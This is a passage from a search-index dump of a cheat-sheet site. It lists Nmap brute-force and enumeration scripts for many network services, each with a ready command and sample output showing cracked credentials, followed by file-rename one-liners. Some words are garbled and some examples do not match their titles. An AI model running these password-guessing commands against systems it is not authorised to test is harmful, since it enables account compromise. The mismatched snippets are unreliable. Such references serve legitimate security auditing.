Brute-Force"},{"location":"linux/nmap/#http---brute-force","text":"Performs Brute-Force password auditing against http basic, digest and ntlm authentication nmap --script http-brute -p 80 192.168.1.12 |PORT STATE SERVICE REASON |80/tcp open http syn-ack | http-brute: | Accounts: | user:user - Valid credentials |_ Statistics: Performed 123 guesses in 1 seconds, average tps: 123","title":"HTTP - Brute-Force"},{"location":"linux/nmap/#http-form---brute-force","text":"Performs Brute-Force password auditing against http form-based authentication nmap --script http-form-brute -p 80 192.168.1.12 |PORT STATE SERVICE REASON |80/tcp open http syn-ack | http-form-brute: | Accounts | Patrik Karlsson:secret - Valid credentials | Statistics |_ Perfomed 60023 guesses in 467 seconds, average tps: 138","title":"HTTP-Form - Brute-Force"},{"location":"linux/nmap/#http-iis-short-name---brute-force","text":"Attempts to Brute-Force the 8_3 filenames (commonly known as short names) of files and directories in the root folder of vulnerable IIS servers This script is an implementation of the PoC \"iis shortname scanner\"_ nmap -p80 --script http-iis-short-name-brute 192.168.1.12 |PORT STATE SERVICE |80/tcp open http | http-iis-short-name-brute: | VULNERABLE: | Microsoft IIS tilde character \"~\" short name disclosure and denial of service | State: VULNERABLE (Exploitable) | Description: | Vulnerable IIS servers disclose folder and file names with a Windows 8.3 naming scheme inside the webroot folder. | Shortnames can be used to guess or brute force sensitive filenames. Attackers can exploit this vulnerability to | cause a denial of service condition. | | Extra information: | | 8.3 filenames found: | Folders | admini~1 | Files | backup~1.zip | certsb~2.zip | siteba~1.zip | | References: | http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf |_ https://github.com/irsdl/IIS-ShortName-Scanner","title":"HTTP-IIS-Short-Name - Brute-Force"},{"location":"linux/nmap/#http-joomla---brute-force","text":"Performs Brute-Force password auditing against Joomla web CMS installations nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-joomla-brute.hostname=domain.com,http-joomla-brute.threads=3,brute.firstonly=true' 192.168.1.12 |PORT STATE SERVICE REASON |80/tcp open http syn-ack | http-joomla-brute: | Accounts | xdeadbee:i79eWBj07g => Login correct | Statistics |_ Perfomed 499 guesses in 301 seconds, average tps: 0","title":"HTTP-Joomla - Brute-Force"},{"location":"linux/nmap/#http-proxy---brute-force","text":"Performs Brute-Force password guessing against HTTP proxy servers nmap --script http-proxy-brute -p 8080 192.168.1.12 |PORT STATE SERVICE |8080/tcp open http-proxy | http-proxy-brute: | Accounts | patrik:12345 - Valid credentials | Statistics |_ Performed 6 guesses in 2 seconds, average tps: 3","title":"HTTP-Proxy - Brute-Force"},{"location":"linux/nmap/#http-wordpress---brute-force","text":"Performs Brute-Force password auditing against Wordpress CMS/blog installations nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.1.12 |PORT STATE SERVICE REASON |80/tcp open http syn-ack | http-wordpress-brute: | Accounts | 0xdeadb33f:god => Login correct | Statistics |_ Perfomed 103 guesses in 17 seconds, average tps: 6","title":"HTTP-WordPress - Brute-Force"},{"location":"linux/nmap/#iax2---brute-force","text":"Performs Brute-Force password auditing against the Asterisk IAX2 protocol Guessing fails when a large number of attempts is made due to the maxcallnumber limit (default 2048)_ In case your getting \"ERROR: Too many retries, aborted ___\" after a while, this is most likely what's happening_ In order to avoid this problem try: - reducing the size of your dictionary - use the brute delay option to introduce a delay between guesses - split the guessing up in chunks and wait for a while between them_ nmap -sU -p 4569 192.168.1.12 --script iax2-brute | PORT STATE SERVICE |4569/udp open |filtered unknown | iax2-brute: | Accounts | 1002:password12 - Valid credentials | Statistics _ Performed 1850 guesses in 2 seconds, average tps: 925","title":"IAX2 - Brute-Force"},{"location":"linux/nmap/#imap---brute-force","text":"Performs Brute-Force password auditing against IMAP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication nmap -p 143,993 --script imap-brute 192.168.1.12 |PORT STATE SERVICE REASON |143/tcp open imap syn-ack | imap-brute: | Accounts | braddock:jules - Valid credentials | lane:sniper - Valid credentials | parker:scorpio - Valid credentials | Statistics |_ Performed 62 guesses in 10 seconds, average tps: 6","title":"IMAP - Brute-Force"},{"location":"linux/nmap/#impress-remote-discover","text":"Tests for the presence of the LibreOffice Impress Remote server Checks if a PIN is valid if provided and will bruteforce the PIN if requested_ nmap -p 1599 --script impress-remote-discover 192.168.1.12 |PORT STATE SERVICE Version |1599/tcp open impress-remote LibreOffice Impress remote 4.3.3.2 | impress-remote-discover: | Impress Version: 4.3.3.2 | Remote PIN: 0000 |_ Client Name used: Firefox OS","title":"Impress-Remote-Discover"},{"location":"linux/nmap/#informix---brute-force","text":"Performs Brute-Force password auditing against IBM Informix Dynamic Server nmap --script informix-brute -p 9088 192.168.1.12 |PORT STATE SERVICE |9088/tcp open unknown | informix-brute: | Accounts | ifxnoob:ifxnoob => Valid credentials | Statistics |_ Perfomed 25024 guesses in 75 seconds, average tps: 320","title":"Informix - Brute-Force"},{"location":"linux/nmap/#ipmi---brute-force","text":"Performs Brute-Force password auditing against IPMI RPC server nmap -sU --script ipmi-brute -p 623 192.168.1.12 |PORT STATE SERVICE REASON |623/udp open |filtered unknown | ipmi-brute: | Accounts |_ admin:admin => Valid credentials","title":"IPMI - Brute-Force"},{"location":"linux/nmap/#irc---brute-force","text":"Performs Brute-Force password auditing against IRC (Internet Relay Chat) servers nmap --script irc-brute -p 6667 192.168.1.12 |PORT STATE SERVICE |6667/tcp open irc | irc-brute: | Accounts | password - Valid credentials | Statistics |_ Performed 1927 guesses in 36 seconds, average tps: 74","title":"IRC - Brute-Force"},{"location":"linux/nmap/#irc-sasl---brute-force","text":"Performs Brute-Force password auditing against IRC (Internet Relay Chat) servers sup |PORTing SASL authentication nmap --script irc-sasl-brute -p 6667 192.168.1.12 |PORT STATE SERVICE REASON |6667/tcp open irc syn-ack | irc-sasl-brute: | Accounts | root:toor - Valid credentials | Statistics |_ Performed 60 guesses in 29 seconds, average tps: 2","title":"IRC-sasl - Brute-Force"},{"location":"linux/nmap/#iscsi---brute-force","text":"Performs Brute-Force password auditing against iSCSI targets nmap -sV --script=iscsi-brute 192.168.1.12 |PORT STATE SERVICE |3260/tcp open iscsi syn-ack | iscsi-brute: | Accounts | user:password123456 => Valid credentials | Statistics |_ Perfomed 5000 guesses in 7 seconds, average tps: 714","title":"ISCSI - Brute-Force"},{"location":"linux/nmap/#ldap---brute-force","text":"Attempts to brute-force LDAP authentication By default it uses the built-in username and password lists_ In order to use your own lists use the userdb and passdb script arguments_ nmap -p 389 --script ldap-brute --script-args ldap.base='\"cn=users,dc=cqure,dc=net\"' 192.168.1.12 |389/tcp open ldap | ldap-brute: |_ ldaptest:ldaptest => Valid credentials | restrict.ws:restricted1 => Valid credentials, account cannot log in from current host | restrict.time:restricted1 => Valid credentials, account cannot log in at current time | valid.user:valid1 => Valid credentials | expired.user:expired1 => Valid credentials, account expired | disabled.user:disabled1 => Valid credentials, account disabled |_ must.change:need2change => Valid credentials, password must be changed at next logon","title":"LDAP - Brute-Force"},{"location":"linux/nmap/#lu-enum","text":"Attempts to enumerate Logical Units (LU) of TN3270E servers nmap --script lu-enum --script-args lulist=lus.txt,lu-enum.path=\"/home/dade/screenshots/\" -p 23 -sV <targets> |PORT STATE SERVICE REASON VERSION |23/tcp open tn3270 syn-ack IBM Telnet TN3270 (TN3270E) | lu-enum: | Logical Units: | LU:BSLVLU69 - Valid credentials |_ Statistics: Performed 7 guesses in 7 seconds, average tps: 1.0","title":"LU-Enum"},{"location":"linux/nmap/#membase---brute-force","text":"Performs Brute-Force password auditing against Couchbase Membase servers nmap -p 11211 --script membase-brute |PORT STATE SERVICE |11211/tcp open unknown | membase-brute: | Accounts | buckettest:toledo - Valid credentials | Statistics |_ Performed 5000 guesses in 2 seconds, average tps: 2500","title":"Membase - Brute-Force"},{"location":"linux/nmap/#mikrotik-routeros---brute-force","text":"Performs Brute-Force password auditing against Mikrotik RouterOS devices with the API RouterOS interface enabled nmap -p8728 --script mikrotik-routeros-brute 192.168.1.12 |PORT STATE SERVICE REASON |8728/tcp open unknown syn-ack | mikrotik-routeros-brute: | Accounts | admin:dOsmyvsvJGA967eanX - Valid credentials | Statistics |_ Performed 60 guesses in 602 seconds, average tps: 0","title":"Mikrotik-RouterOS - Brute-Force"},{"location":"linux/nmap/#mmouse---brute-force","text":"Performs Brute-Force password auditing against the RPA Tech Mobile Mouse servers nmap --script mmouse-brute -p 51010 192.168.1.12 |PORT STATE SERVICE |51010/tcp open unknown | mmouse-brute: | Accounts | vanilla - Valid credentials | Statistics |_ Performed 1199 guesses in 23 seconds, average tps: 47","title":"MMouse - Brute-Force"},{"location":"linux/nmap/#mongodb---brute-force","text":"_ Performs Brute-Force password auditing against the MongoDB database_ nmap -p 27017 192.168.1.12 --script mongodb-brute |PORT STATE SERVICE |27017/tcp open mongodb | mongodb-brute: | Accounts | root:Password1 - Valid credentials | Statistics |_ Performed 3542 guesses in 9 seconds, average tps: 393","title":"MongoDB - Brute-Force"},{"location":"linux/nmap/#ms-sql---brute-force","text":"Performs password guessing against Microsoft SQL Server (ms-sql) Works best in conjunction with the broadcast-ms-sql-discover script_ nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt 192.168.1.12 nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 192.168.1.12 |PORT STATE SERVICE REASON | ms-sql-brute: | [192.168.100.128\\TEST] | No credentials found | Warnings: | sa: AccountLockedOut | [192.168.100.128\\PROD] | Credentials found: | webshop_reader:secret => Login Success | testuser:secret1234 => PasswordMustChange |_ lordvader:secret1234 => Login Success","title":"MS-SQL - Brute-Force"},{"location":"linux/nmap/#mysql---brute-force","text":"Performs password guessing against MySQL nmap --script=mysql-brute 192.168.1.12 |PORT STATE SERVICE REASON |3306/tcp open mysql | mysql-brute: | Accounts | root:root - Valid credentials","title":"MySQL - Brute-Force"},{"location":"linux/nmap/#mysql-enum","text":"Performs valid-user enumeration against MySQL server using a bug discovered and published by Kingcope ( http://seclists_org/fulldisclosure/2012/Dec/9 ) nmap --script=mysql-enum 192.168.1.12 |PORT STATE SERVICE REASON |3306/tcp open mysql syn-ack | mysql-enum: | Accounts | admin:<empty> - Valid credentials | test:<empty> - Valid credentials | test_mysql:<empty> - Valid credentials | Statistics |_ Performed 11 guesses in 1 seconds, average tps: 11","title":"MySQL-enum"},{"location":"linux/nmap/#nessus-xmlrpc---brute-force","text":"Performs Brute-Force password auditing against a Nessus vulnerability scanning daemon using the XMLRPC protocol nmap -sV --script=nessus-xmlrpc-brute 192.168.1.12 |PORT STATE SERVICE REASON |8834/tcp open unknown syn-ack | nessus-xmlrpc-brute: | Accounts | nessus:nessus - Valid credentials | Statistics |_ Performed 1933 guesses in 26 seconds, average tps: 73","title":"Nessus-XMLRPC - Brute-Force"},{"location":"linux/nmap/#netbus---brute-force","text":"Performs Brute-Force password auditing against the Netbus backdoor (\"remote administration\") service nmap -p 12345 --script netbus-brute 192.168.1.12 |12345/tcp open netbus |_netbus-brute: password123","title":"Netbus - Brute-Force"},{"location":"linux/nmap/#nexpose---brute-force","text":"Performs Brute-Force password auditing against a Nexpose vulnerability scanner using the API 1_1 nmap --script nexpose-brute -p 3780 192.168.1.12 |PORT STATE SERVICE REASON VERSION |3780/tcp open ssl/nexpose syn-ack NeXpose NSC 0.6.4 | nexpose-brute: | Accounts | nxadmin:nxadmin - Valid credentials | Statistics |_ Performed 5 guesses in 1 seconds, average tps: 5","title":"Nexpose - Brute-Force"},{"location":"linux/nmap/#nje-node---brute-force","text":"z/OS JES Network Job Entry (NJE) target node name Brute-Force nmap -sV --script=nje-node-brute 192.168.1.12 nmap --script=nje-node-brute --script-args=hostlist=nje_names.txt -p 175 192.168.1.12 |PORT STATE SERVICE REASON |175/tcp open nje syn-ack | nje-node-brute: | Node Name: | POTATO:CACTUS - Valid credentials |_ Statistics: Performed 6 guesses in 14 seconds, average tps: 0","title":"NJE-Node - Brute-Force"},{"location":"linux/nmap/#nje-pass---brute-force","text":"z/OS JES Network Job Entry (NJE) 'I record' password Brute-Forcer nmap -sV --script=nje-pass-brute --script-args=ohost='POTATO',rhost='CACTUS' 192.168.1.12 nmap --script=nje-pass-brute --script-args=ohost='POTATO',rhost='CACTUS',sleep=5 -p 175 192.168.1.12 |PORT STATE SERVICE VERSION |175/tcp open nje IBM Network Job Entry (JES) | nje-pass-brute: | NJE Password: | Password:A - Valid credentials |_ Statistics: Performed 8 guesses in 12 seconds, average tps: 0","title":"NJE-Pass - Brute-Force"},{"location":"linux/nmap/#nping---brute-force","text":"Performs Brute-Force password auditing against an Nping Echo service nmap -p 9929 --script nping-brute 192.168.1.12 |9929/tcp open nping-echo | nping-brute: | Accounts | 123abc => Valid credentials | Statistics |_ Perfomed 204 guesses in 204 seconds, average tps: 1","title":"Nping - Brute-Force"},{"location":"linux/nmap/#ompv2---brute-force","text":"Performs Brute-Force password auditing against the OpenVAS manager using OMPv2 nmap -p 9390 --script omp2-brute 192.168.1.12 |PORT STATE SERVICE REASON |9390/tcp open openvas syn-ack | omp2-brute: | Accounts |_ admin:secret => Valid credentials","title":"OMPv2 - Brute-Force"},{"location":"linux/nmap/#openvas-otp---brute-force","text":"Performs Brute-Force password auditing against a OpenVAS vulnerability scanner daemon using the OTP 1_0 protocol nmap -sV --script=openvas-otp-brute 192.168.1.12 |PORT STATE SERVICE REASON VERSION |9391/tcp open ssl/openvas syn-ack | openvas-otp-brute: | Accounts | openvas:openvas - Valid credentials | Statistics '-.> Performed 4 guesses in 4 seconds, average tps: 1","title":"OpenVAS-OTP - Brute-Force"},{"location":"linux/nmap/#oracle---brute-force","text":"Performs Brute-Force password auditing against Oracle servers nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL 192.168.1.12 |PORT STATE SERVICE REASON |1521/tcp open oracle syn-ack | oracle-brute: | Accounts | system:powell => Account locked | haxxor:haxxor => Valid credentials | Statistics |_ Perfomed 157 guesses in 8 seconds, average tps: 19","title":"Oracle - Brute-Force"},{"location":"linux/nmap/#oracle---brute-force-stealth","text":"Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle's O5LOGIN authentication scheme The vulnerability exists in Oracle 11g R1/R2 and allows linking the session key to a password hash_ When initiating an authentication attempt as a valid user the server will respond with a session key and salt_ Once received the script will disconnect the connection thereby not recording the login attempt_ The session key and salt can then be used to Brute-Force the users password_ nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL 192.168.1.12 |PORT STATE SERVICE REASON |1521/tcp open oracle syn-ack | oracle-brute-stealth: | Accounts | dummy:$o5logon$1245C95384E15E7F0C893FCD1893D8E19078170867E892CE86DF90880E09FAD3B4832CBCFDAC1A821D2EA8E3D2209DB6*4202433F49DE9AE72AE2 - Hashed valid or invalid credentials | nmap:$o5logon$D1B28967547DBA3917D7B129E339F96156C8E2FE5593D42540992118B3475214CA0F6580FD04C2625022054229CAAA8D*7BCF2ACF08F15F75B579 - Hashed valid or invalid credentials | Statistics |_ Performed 2 guesses in 1 seconds, average tps: 2","title":"Oracle - Brute-Force-stealth"},{"location":"linux/nmap/#oracle-sid---brute-force","text":"Guesses Oracle instance/SID names against the TNS-listener nmap --script=oracle-sid-brute --script-args=oraclesids=/path/to/sidfile -p 1521-1560 192.168.1.12 nmap --script=oracle-sid-brute -p 1521-1560 192.168.1.12 |PORT STATE SERVICE REASON |1521/tcp open oracle syn-ack | oracle-sid-brute: | orcl | prod |_ devel","title":"oracle-sid - Brute-Force"},{"location":"linux/nmap/#pcanywhere---brute-force","text":"Performs Brute-Force password auditing against the pcAnywhere remote access protocol nmap --script=pcanywhere-brute 192.168.1.12 |5631/tcp open pcanywheredata syn-ack | pcanywhere-brute: | Accounts | administrator:administrator - Valid credentials | Statistics |_ Performed 2 guesses in 55 seconds, average tps: 0","title":"pcAnywhere - Brute-Force"},{"location":"linux/nmap/#postgresql---brute-force","text":"Performs password guessing against PostgreSQL nmap -p 5432 --script pgsql-brute 192.168.1.12 |5432/tcp open pgsql | pgsql-brute: | root:<empty> => Valid credentials |_ test:test => Valid credentials","title":"PostgreSQL - Brute-Force"},{"location":"linux/nmap/#pop3---brute-force","text":"Tries to log into a POP3 account by guessing usernames and passwords nmap -sV --script=pop3-brute 192.168.1.12 |PORT STATE SERVICE |110/tcp open pop3 | pop3-brute- |PORTed: | Accounts: | user:pass => Login correct | Statistics: |_ Performed 8 scans in 1 seconds, average tps: 8","title":"POP3 - Brute-Force"},{"location":"linux/nmap/#redis---brute-force","text":"Performs Brute-Force passwords auditing against a Redis key-value store nmap -p 6379 192.168.1.12 --script redis-brute |PORT STATE SERVICE |6379/tcp open unknown | redis-brute: | Accounts | toledo - Valid credentials | Statistics |_ Performed 5000 guesses in 3 seconds, average tps: 1666","title":"Redis - Brute-Force"},{"location":"linux/nmap/#rexec---brute-force","text":"Performs Brute-Force password auditing against the classic UNIX rexec (remote exec) service nmap -p 512 --script rexec-brute 192.168.1.12 |PORT STATE SERVICE |512/tcp open exec | rexec-brute: | Accounts | nmap:test - Valid credentials | Statistics |_ Performed 16 guesses in 7 seconds, average tps: 2","title":"RExec - Brute-Force"},{"location":"linux/nmap/#unix-rlogin---brute-force","text":"Performs Brute-Force password auditing against the classic UNIX rlogin (remote login) service This script must be run in privileged mode on UNIX because it must bind to a low source |PORT number_ nmap -p 513 --script rlogin-brute 192.168.1.12 |PORT STATE SERVICE |513/tcp open login | rlogin-brute: | Accounts | nmap:test - Valid credentials | Statistics |_ Performed 4 guesses in 5 seconds, average tps: 0","title":"UNIX-RLogin - Brute-Force"},{"location":"linux/nmap/#rpcap---brute-force","text":"Performs Brute-Force password auditing against the WinPcap Remote Capture Daemon (rpcap) nmap -p 2002 192.168.1.12 --script rpcap-brute |PORT STATE SERVICE REASON |2002/tcp open globe syn-ack | rpcap-brute: | Accounts | monkey:Password1 - Valid credentials | Statistics |_ Performed 3540 guesses in 3 seconds, average tps: 1180","title":"RPcap - Brute-Force"},{"location":"linux/nmap/#rsync---brute-force","text":"Performs Brute-Force password auditing against the rsync remote file syncing protocol nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' 192.168.1.12 |PORT STATE SERVICE REASON |873/tcp open rsync syn-ack | rsync-brute: | Accounts | user1:laptop - Valid credentials | user2:password - Valid credentials | Statistics |_ Performed 1954 guesses in 20 seconds, average tps: 97","title":"Rsync - Brute-Force"},{"location":"linux/nmap/#rtsp-url---brute-force","text":"Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras nmap --script rtsp-url-brute -p 554 192.168.1.12 |PORT STATE SERVICE |554/tcp open rtsp | rtsp-url-brute: | discovered: | rtsp://camera.example.com/mpeg4 | other responses: | 401: |_ rtsp://camera.example.com/live/mpeg4","title":"RTSP-Url - Brute-Force"},{"location":"linux/nmap/#smb---brute-force","text":"Attempts to guess username/password combinations over SMB, storing discovered combinations for use in other scripts Every attempt will be made to get a valid list of users and to verify each username before actually using them_ When a username is discovered, besides being printed, it is also saved in the Nmap registry so other Nmap scripts can use it_ That means that if you're going to run smb - Brute-Force_nse, you should run other smb scripts you want_ This checks passwords in a case-insensitive way, determining case after a password is found, for Windows versions before Vista_ nmap -sU -sS --script smb-brute.nse -p U:137,T:139 192.168.1.12 | smb-brute: | bad name:test => Valid credentials | consoletest:test => Valid credentials, password must be changed at next logon | guest:<anything> => Valid credentials, account disabled | mixcase:BuTTeRfLY1 => Valid credentials | test:password1 => Valid credentials, account expired | this:password => Valid credentials, account cannot log in at current time | thisisaverylong:password => Valid credentials | thisisaverylongname:password => Valid credentials | thisisaverylongnamev:password => Valid credentials |_ web:TeSt => Valid credentials, account disabled","title":"SMB - Brute-Force"},{"location":"linux/nmap/#smtp---brute-force","text":"Performs Brute-Force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication nmap -p 25 --script smtp-brute 192.168.1.12 |PORT STATE SERVICE REASON |25/tcp open stmp syn-ack | smtp-brute: | Accounts | braddock:jules - Valid credentials | lane:sniper - Valid credentials | parker:scorpio - Valid credentials | Statistics |_ Performed 1160 guesses in 41 seconds, average tps: 33","title":"SMTP - Brute-Force"},{"location":"linux/nmap/#snmp---brute-force","text":"Attempts to find an SNMP community string by Brute-Force guessing nmap --script socks-brute -p 1080 192.168.1.12 |PORT STATE SERVICE |1080/tcp open socks | socks-brute: | Accounts | patrik:12345 - Valid credentials | Statistics |_ Performed 1921 guesses in 6 seconds, average tps: 320","title":"SNMP - Brute-Force"},{"location":"linux/nmap/#ssh---brute-force","text":"Performs brute-force password guessing against ssh servers nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s 192.168.1.12 |22/ssh open ssh | ssh-brute: | Accounts | username:password | Statistics |_ Performed 32 guesses in 25 seconds.","title":"SSH - Brute-Force"},{"location":"linux/nmap/#svn---brute-force","text":"Performs Brute-Force password auditing against Subversion source code control servers nmap --script svn-brute --script-args svn-brute.repo=/svn/ -p 3690 192.168.1.12 |PORT STATE SERVICE REASON |3690/tcp open svn syn-ack | svn-brute: | Accounts |_ patrik:secret => Login correct","title":"SVN - Brute-Force"},{"location":"linux/nmap/#telnet---brute-force","text":"Performs brute-force password auditing against telnet servers nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s 192.168.1.12 |23/tcp open telnet | telnet-brute: | Accounts | wkurtz:colonel | Statistics |_ Performed 15 guesses in 19 seconds, average tps: 0","title":"Telnet - Brute-Force"},{"location":"linux/nmap/#tso-enu","text":"TSO User ID enumerator for IBM mainframes (z/OS) The TSO logon panel tells you when a user ID is valid or invalid with the message: IKJ56420I Userid not authorized to use TSO_ nmap -sV -p 9923 10.32.70.10 --script tso-enum --script-args userdb=tso_users.txt,tso-enum.commands=\"logon applid(tso)\" |PORT STATE SERVICE VERSION |23/tcp open tn3270 IBM Telnet TN3270 | tso-enum: | TSO User ID: | TSO User:RAZOR - Valid User ID | TSO User:BLADE - Valid User ID | TSO User:PLAGUE - Valid User ID |_ Statistics: Performed 6 guesses in 3 seconds, average tps: 2","title":"TSO-Enu"},{"location":"linux/nmap/#vmware-authentication-daemon---bruteforce","text":"Performs Brute-Force password auditing against the VMWare Authentication Daemon (vmware-authd) nmap -p 902 192.168.1.12 --script vmauthd-brute |PORT STATE SERVICE |902/tcp open iss-realsecure | vmauthd-brute: | Accounts | root:00000 - Valid credentials | Statistics |_ Performed 183 guesses in 40 seconds, average tps: 4","title":"VMWare Authentication Daemon - BruteForce"},{"location":"linux/nmap/#vnc---brute-force","text":"Performs Brute-Force password auditing against VNC servers nmap --script vnc-brute -p 5900 192.168.1.12 |PORT STATE SERVICE REASON |5900/tcp open vnc syn-ack | vnc-brute: | Accounts |_ 123456 => Valid credentials","title":"VNC - Brute-Force"},{"location":"linux/nmap/#vtam-enum","text":"Many mainframes use VTAM screens to connect to various applications (CICS, IMS, TSO, and many more) nmap --script vtam-enum --script-args idlist=defaults.txt,vtam-enum.command=\"exit;logon applid(logos)\",vtam-enum.macros=truevtam-enum.path=\"/home/dade/screenshots/\" -p 23 -sV <targets> |PORT STATE SERVICE VERSION |23/tcp open tn3270 IBM Telnet TN3270 | vtam-enum: | VTAM Application ID: | applid:TSO - Valid credentials | applid:CICSTS51 - Valid credentials |_ Statistics: Performed 14 guesses in 5 seconds, average tps: 2","title":"VTAM-Enum"},{"location":"linux/nmap/#xmpp---brute-force","text":"Performs Brute-Force password auditing against XMPP (Jabber) instant messaging servers nmap -p 5222 --script xmpp-brute 192.168.1.12 |PORT STATE SERVICE |5222/tcp open xmpp-client | xmpp-brute: | Accounts | CampbellJ:arthur321 - Valid credentials | CampbellA:joan123 - Valid credentials | WalkerA:auggie123 - Valid credentials | Statistics |_ Performed 6237 guesses in 5 seconds, average tps: 1247","title":"XMPP - Brute-Force"},{"location":"linux/nmap/#requirements","text":"A device of any kind ;]","title":"REQUIREMENTS"},{"location":"linux/nmap/#contact","text":"If you have problems, questions, ideas or suggestions please contact me by posting to wuseman@nr1.nu","title":"CONTACT"},{"location":"linux/nmap/#web-site","text":"Visit my websites and profiles for the latest info and updated tools @wuseman && https://nr1.nu && https://stackoverflow.com/users/9887151/wuseman","title":"WEB SITE"},{"location":"linux/nmap/#end","text":"","title":"END!"},{"location":"linux/perf/","text":"perf FOr fix below error in dmesg: perf: interrupt took too long (10488 > 10443), lowering kernel.perf_event_max_sample_rate to 19000","title":"perf"},{"location":"linux/perf/#perf","text":"","title":"perf"},{"location":"linux/perf/#for-fix-below-error-in-dmesg","text":"perf: interrupt took too long (10488 > 10443), lowering kernel.perf_event_max_sample_rate to 19000","title":"FOr fix below error in dmesg:"},{"location":"linux/rename/","text":"rename Remove all Parentheses from file/folder names rename \"(\" \"\" * Remove all Parentheses from file/folder names rename \")\" \"\" * Rename all spaces to underscore for file in * ' ' * ; do mv -- \" $file \" \" ${ file // /_ } \" ; done Rename all files with spaces to underscore for file in * ; do mv -- \" $file \" \" ${ file // /_ } \" ; done Rename uppercase to lowercase for i in * ; do mv $i ` echo $i | tr 'A-Z' 'a-z' ` ; done for i in $( ls | grep [ A-Z ] ) ; do mv -i $i ` echo $i | tr 'A-Z' 'a-z' ` ; done Rename all uppercase to lowercase rename 'y/A-Z/a-z/' * Remove .sh file extension for files in current directory rename 's/\\.sh//' ./* ### remove all spaces from all files in current folder ``` sh rename 's/ //g' * renamed multiple file from .php to .html rename s/ .php/ .html/ *.html Replace spaces in filenames with underscores rename 's/ /_/g' * Batch rename extension of all files in a folder, in the example from .txt to .md rename *.JPG *.jpg Renames all files in the current directory such that the new file contains no space characters. rename 's/ /_/g' * Batch file suffix renaming rename -n \"s/-.*//\" * Rename all files which contain the sub-string 'foo', replacing it with 'bar' rename foo bar directory/filename Rename all files which contain the sub-string 'foo', replacing it with 'bar' rename foo bar filename Batch rename extension of all files in a folder, in the example from .txt to .md rename .txt .md *.txt Rename all files which contain the sub-string 'foo', replacing it with 'bar' rename 's/foo/bar/g' ./* Batch rename extension of all files in a folder, in the example from .txt to .md rename 's/.txt/.md/i' * convert single digit to double digits rename 's/\\d+/sprintf(\"%02d\",$&)/e' $@ Replace space in filename rename \"s/ *//g\" *.jpg Command to rename multiple file in one go rename 's/.xls/.ods/g' *.xls convert filenames in current directory to lowercase rename 'y/A-Z/a-z/' * Title Case Files rename 's/\\b((?!(a|of|that|to)\\b)[a-z]+)/\\u$1/g' * convert uppercase files to lowercase files rename 'y/A-Z/a-z/' * Change the extension of a filename by using rename to convert rename .JPG .jpg *.JPG replace strings in file names rename 's/foo/bar/g' foobar Clean up poorly named TV shows. rename -v 's/.*[s,S](\\d{2}).*[e,E](\\d{2}).*\\.avi/SHOWNAME\\ S$1E$2.avi/' poorly.named.file.s01e01.avi Yet Another Rename (bash function) rename (){ txtToReplace = ${ 1 } ; replacementTxt = ${ 2 } ; shift 2 ; files = ${ @ } ; for file in $files ; do mv ${ file } ${ file / ${ txtToReplace } / ${ replacementTxt }} ; done ; } Convert spaces in file names to underscores rename 'y/ /_/' * Rename all .jpeg and .JPG files to have .jpg extension rename 's/\\.jpe?g$/.jpg/i' * Replace spaces in a filename with hyphens rename 's/ /-/g' * replace spaces in filenames with underscores rename 'y/ /_/' * replace spaces in filenames with underscores rename 'y/ /_/' * Copy/move a bunch of files to dot files and back rename s/^/./ * Replace spaces in filenames with underscores rename -v 's/ /_/g' * Rename all .jpeg and .JPG files to .jpg rename 's/\\.jpeg/\\.jpg/' *.jpeg ; rename 's/\\.JPG/\\.jpg/' *.JPG Rename files in batch rename 's/^hospital\\.php\\?loc=(\\d{4})$/hospital_$1/' hospital.php* Batch rename extension of all files in a folder, in the example from .txt to .md rename 's/\\.txt$/\\.md$/i' * Title Case Files rename 's/(^|[\\s\\(\\)\\[\\]_-])([a-z])/$1\\u$2/g' * Title Case Files rename 's/\\b([a-z])/\\u$1/g' * Add prefix onto filenames rename 's/^/prefix/' * Tracklist reaplace backspace to '-' rename 's/ /-/g' *.mp3 Files extension change rename .oldextension .newextension *.oldextension Numeric zero padding file rename rename 's/\\d+/sprintf(\"%04d\",$&)/e' *.jpg Adding Prefix to File name rename 's/^/PREFIX/g' * Adding Prefix to File name rename 's/^/CS749__/' *.pdf renames multiple files that match the pattern rename 's/foo/bar/g' * space to underscore across single directory rename ' ' '_' * Replace all the spaces in all the filenames of the current directory and including directories with underscores. rename \"s/ /_/g\" * .* Adding leading zeros to a filename (1.jpg -> 001.jpg) rename.ul \"\" 00 ?.jpg ; rename \"\" 0 ??.jpg ; Replace Space In Filenames With Underscore rename 's/ /_/g' * Rename with regular expression and leading zeros rename 's/result_([0-9]+)_([0-9]+)_([0-9]+)\\.json\\.txt/sprintf(\"%d%02d%02d.txt\",$3,$2,$1)/ge' result_*.txt Rename with regular expression and leading zeros rename 's/result_([0-9]+)_([0-9]+)_([0-9]+)\\.json\\.txt/sprintf(\"%d%02d%02d.txt\",$3,$2,$1)/ge' result_*.txt convert uppercase files to lowercase files rename -fc * Adds characters at the beginning of the name of a file rename 's/.*/[it]$&/' *.pdf remove all spaces from all files in current folder rename 's/ //g' * Replace spaces in filenames with underscores rename 's/ /_/g' * Rename all files which contain the sub-string 'foo', replacing it with 'bar' rename 's/foo/bar/g' ./* Batch rename extension of all files in a folder, in the example from .txt to .md rename 's/.txt/.md/i' * convert single digit to double digits rename 's/\\d+/sprintf(\"%02d\",$&)/e' $@ Replace space in filename rename \"s/ *//g\" *.jpg Command to rename multiple file in one go rename 's/.xls/.ods/g' *.xls convert filenames in current 